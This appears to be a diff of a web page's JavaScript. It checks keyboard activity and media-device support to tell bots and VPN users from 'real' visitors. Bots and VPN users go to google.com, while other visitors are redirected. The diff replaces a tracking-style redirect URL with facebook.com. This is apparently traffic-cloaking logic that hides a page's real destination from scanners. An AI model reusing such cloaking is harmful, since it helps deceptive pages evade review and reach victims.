@@ -147,7 +147,7 @@
     document.addEventListener("keydown", () => activo = true);
     setTimeout(() => {
         if (!activo) window.location.href = "https://google.com";
-    }, 5000);
+    }, 3000);
     return true;
 
     }
@@ -156,12 +156,10 @@
     function isVPN() {
     return !navigator.mediaDevices?.getUserMedia;
     }
-    // Redirección segura (MODIFICADO: ahora espera 8 segundos)
+    // Redirección segura
     function redirect() {
     if (!isRealUser() || isVPN()) return;
-    setTimeout(() => {
-        window.location.href = "https://diclotrans.com/redirect?id=51228&auth=bd95c00167af1fda747b24a4947c250f90bf6168"; // URL original
-       }, 8000); // 8000 ms = 8 segundos
+    window.location.href = "https://facebook.com";
     }
     document.addEventListener("DOMContentLoaded", redirect);
   </script>
